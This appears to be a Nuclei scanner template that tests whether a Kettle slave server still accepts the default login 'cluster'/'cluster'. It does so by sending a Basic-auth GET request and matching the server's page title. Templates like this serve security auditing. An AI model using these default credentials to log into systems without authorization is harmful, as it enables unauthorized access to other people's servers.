id: kettle-default-login

info:
  name: Kettle Default Login
  author: For3stCo1d
  severity: medium
  tags: kettle,default-login

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}

    attack: pitchfork
    payloads:
      username:
        - cluster
      password:
        - cluster

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<TITLE>Kettle slave server</TITLE>'

      - type: status
        status:
          - 200
